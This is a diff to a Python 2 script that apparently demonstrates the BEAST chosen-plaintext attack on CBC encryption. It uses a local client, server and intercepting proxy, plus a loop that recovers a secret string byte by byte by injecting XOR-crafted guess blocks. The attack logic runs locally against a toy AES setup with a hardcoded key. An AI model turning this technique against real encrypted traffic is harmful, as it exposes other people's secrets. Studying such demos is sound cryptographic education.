@@ -14,22 +14,49 @@ import sys
 import struct
 import threading
 import time
-from utils.color import draw
+import os
+from utils.view import *
 from pprint import pprint
 from struct import *
 from itertools import cycle, izip
+from Crypto.Cipher import AES
+from Crypto import Random
+
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
+unpad = lambda s : s[:-ord(s[len(s)-1:])]
+
+class AESCipher:
+    def __init__( self, key ):
+        self.key = key
+        self.iv = Random.new().read( AES.block_size )
+
+    def set_vector_init(self, iv):
+        self.iv = iv
+
+    def encrypt( self, raw ):
+        raw = pad(raw)
+        iv = self.iv
+        cipher = AES.new( self.key, AES.MODE_CBC, iv )
+        return iv + cipher.encrypt( raw )
+
+    def decrypt( self, enc ):
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        return unpad(cipher.decrypt( enc[16:] ))
+
 
 class SecureTCPHandler(SocketServer.BaseRequestHandler):
   def handle(self):
-    self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
     #loop to avoid broken pipe
     while True:
         try:
             data = self.request.recv(1024)
             if data == '':
                 break
-            print map(''.join, zip(*[iter(data)]*16))
-            self.request.send(b'OK')
+            #print "serveur"
+            #print split_len(binascii.hexlify(data), 32)
+            #print ''
         except ssl.SSLError as e:
             pass
     return
@@ -62,35 +89,34 @@ class Server:
         self.httpd.shutdown()
         return
 
-class Client:
+class Client(AESCipher):
     """ The unsecure post of the client can be a "unsecure" browser for example.
     The client generate a random cookie and send it to the server through the proxy
     The attacker by injecting javascript code can control the sending request of the client to the proxy -> server
     """
 
-    def __init__(self, host, port):
+    def __init__(self, host, port, cbc):
         self.proxy_host = host
         self.proxy_port = port
+        self.cbc = cbc
         self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
         print draw("Sending request : ", bold=True, fg_yellow=True)
-        print draw("the secret is " + "Gyabscdefghicas" + "\n\n",  bold=True, fg_yellow=True)
+        print draw("the secret is aGybscdefghicasaa" + "\n\n",  bold=True, fg_yellow=True)
 
     def connection(self):
         # Initialization of the client
         ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_TLSv1)
         ssl_sock.connect((self.proxy_host,self.proxy_port))
         ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         self.socket = ssl_sock
         return
-    
-    def request(self, path=0, data=0):
-        srt_path = ''
-        for x in range(0,path):
-            srt_path += 'A'
+
+    def request_send(self, prefix=0, data=0):
+        if data == 0:
+            data = prefix*"a" + "the secret is aGybscdefghicasaa"
         try:
-            self.socket.sendall(b"the secret is " + srt_path + "Gyabscdefghicas")
-            msg = "".join([str(i) for i in self.socket.recv(1024).split(b"\r\n")])
+            data = self.cbc.encrypt(data)
+            self.socket.sendall(data)
         except ssl.SSLError as e:
             pass
         pass
@@ -124,40 +150,22 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
                     if len(data) == 0:
                         running = False
                         break
-
-                    if data_altered is True:
-                        (content_type, version, length) = struct.unpack('>BHH', data[0:5])
-                        #if content_type == 23:
-                            #exploit.set_decipherable(True)
-                        #data_altered = False
-                    # we send data to the client
+                    # serveur -> client
                     self.request.send(data)
 
                 elif source is self.request:
                     
-                    ssl_header = self.request.recv(5)
-                    if ssl_header == '':
-                        running = False
-                        break
-
-                    (content_type, version, length) = struct.unpack('>BHH', ssl_header)
-
-                    data = self.request.recv(length)
+                    data = self.request.recv(1024)
                     if len(data) == 0:
                         running = False
-
-                    if length == 32:
-                        length_header = 32
-
-                    if content_type == 23 and length > length_header:
+                    else:
+                        #print "Alter"
                         exploit.set_length_frame(data)
-                        data = exploit.alter() 
-                        check = binascii.hexlify(data)
-                        print map(''.join, zip(*[iter(check)]*16))
-                        #data_altered = True  
+                        exploit.alter()
+                        #print ''
                     
                     # we send data to the server
-                    socket_server.send(ssl_header+data)
+                    socket_server.send(data)
         return
 
 class Proxy:
@@ -183,98 +191,97 @@ class Proxy:
         self.proxy.shutdown()
         return
 
-class BEAST(Client):
+class BEAST(Client, AESCipher):
     """ Assimilate to the attacker
     detect the length of a CBC block
     alter the ethernet frame of the client to decipher a byte regarding the proxy informations
     """
 
-    def __init__(self, client):
+    def __init__(self, client, cbc):
         self.client = client
-        self.length_block = 0
+        self.cbc = cbc
+        self.length_block = 16
         self.start_exploit = False
-        self.start_alter = False
         self.decipherable = False
         self.request = ''
         self.byte_decipher = 0
         self.length_frame = 0
         self.block_decipher = 0
+        self.vector_init = ''
+        self.previous_cipher = ''
+        self.frame = ''
 
     def run(self):
-        print "Start decrypting the request..."
-        self.client_connection()
+        print "Start decrypting the request...\n"
+        
+        secret = []
 
-        self.size_of_block()
+        #client send + alter
+        test = "the secret is a"
+        add_byte = 16
+        t = 0
+        tile = len("the secret is aGybscdefghicasaa") - len("the secret is a")
+        while(t < tile):
+            for i in range(1,256):
 
-        add_byte = self.nb_byte_add()
+                self.start_exploit = True
+                self.client_connection()
+                self.request_send(add_byte)
+                time.sleep(0.05)           
+                #print "frame1"
+                #print split_len(binascii.hexlify(self.frame), 32)
+                original = split_len(binascii.hexlify(self.frame), 32)
 
-        self.start_exploit = True
-        self.send_request_from_the_client(add_byte)
+                self.start_exploit = False
+                p_guess = test + chr(i)
+                #print p_guess
+                xored = self.xor_block(p_guess, i)
 
-        self.start_exploit = False
-        self.start_alter = True
-        self.send_request_from_the_client(add_byte)
+                self.request_send(add_byte, xored)
+                time.sleep(0.05)
+                #print "frame2"
+                #print split_len(binascii.hexlify(self.frame), 32)
+                result = split_len(binascii.hexlify(self.frame), 32)
 
-        print ''
+                ts = getTerminalSize()
+                if ts[0] >= 237:
+                    sys.stdout.write("\r%s ----> %s" % (original[1:], result[1:]))
+                    sys.stdout.flush()
+                else:
+                    sys.stdout.write("\r%s" % (search(i)))
+                    sys.stdout.flush()
+
+                if result[1] == original[2]:
+                    print " Find char " + chr(i) + " after " + str(i) +" tries"
+                    test = p_guess[1:]
+                    add_byte = add_byte - 1
+                    secret.append(chr(i))
+                    t = t + 1
+                    break
+
+        secret = ''.join(secret)
+        print "\nthe secret is " + secret
         self.client_disconect()
         return
 
-    def xor(self, a,b):
-        result = int(a, 16) ^ int(b, 16) # convert to integers and xor them
-        return '{:x}'.format(result)  
-
-    def construct_first_block(self):
-        message = self.vector_init
-        key     = self.previous_cipher
-        guess   = self.create_guess()
-        cyphered = ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))
-        cyphered2 = ''.join(chr(ord(c)^ord(k)) for c,k in izip(cyphered, cycle(guess)))
-        print cyphered2
-        return cyphered2
-
-    def create_guess(self, char=71):
-        length_path = self.length_block - self.block_decipher - 1
-        return 'A' * length_path + ''.join(['%c' % char])
-
-    def nb_byte_add(self):
-        return (self.length_block - len("the secret is ")) + (self.length_block - self.block_decipher - 1)
-
-    def size_of_block(self):
-        print "Begins searching the size of a block...\n"
-        self.send_request_from_the_client()
-        reference_length = self.length_frame
-        i = 0
-        while True:
-            self.send_request_from_the_client(i)
-            current_length = self.length_frame
-            self.length_block = current_length - reference_length
-            if self.length_block != 0:
-                self.nb_prefix = i
-                print draw("CBC block size " + str(self.length_block) + "\n", bold=True)
-                break
-            i += 1
-        self.decipherable = False
+    def xor_strings(self, xs, ys, zs):
+        return "".join(chr(ord(x) ^ ord(y) ^ ord(z)) for x, y, z in zip(xs, ys, zs))
 
     def alter(self):
+        #print self.start_exploit
         if self.start_exploit is True:
             self.frame = bytearray(self.frame)
             self.vector_init = str(self.frame[-self.length_block:])
-            self.previous_cipher = str(self.frame[:self.length_block])
-            return str(self.frame)
-        elif self.start_alter is True:
-            self.frame = bytearray(self.frame)
-            print binascii.hexlify(self.frame)
-            block = self.construct_first_block()
-            print block
-            for i in range(0,16):
-                self.frame[i] = block[i]
-            print binascii.hexlify(self.frame)
+
+            self.cbc.set_vector_init(self.vector_init)
+
+            self.previous_cipher = str(self.frame[self.length_block:self.length_block*2])
             return str(self.frame)
         return self.frame
 
-    def set_decipherable(self, status):
-        self.decipherable = status
-        return
+    def xor_block(self,p_guess, i):
+        xored = self.xor_strings(self.vector_init, self.previous_cipher, p_guess)
+        return xored
 
     def set_length_frame(self, data):
         self.frame = data
@@ -284,8 +291,8 @@ class BEAST(Client):
         self.client.connection()
         return
 
-    def send_request_from_the_client(self, path=0, data=0):
-        self.client.request(path,data)
+    def request_send(self, prefix=0, data=0):
+        self.client.request_send(prefix, data)
         return
 
     def client_disconect(self):
@@ -300,10 +307,11 @@ if __name__ == '__main__':
     parser.add_argument('-v', help='debug mode', action="store_true")
     args = parser.parse_args()
 
+    cbc = AESCipher('V38lKILOJmtpQMHp')
     server   = Server(args.host, args.port)
-    client   = Client(args.host, args.port+1)
+    client   = Client(args.host, args.port+1, cbc)
     spy      = Proxy(args.host, args.port+1)
-    exploit  = BEAST(client)
+    exploit  = BEAST(client, cbc)
 
     server.connection()
     spy.connection()
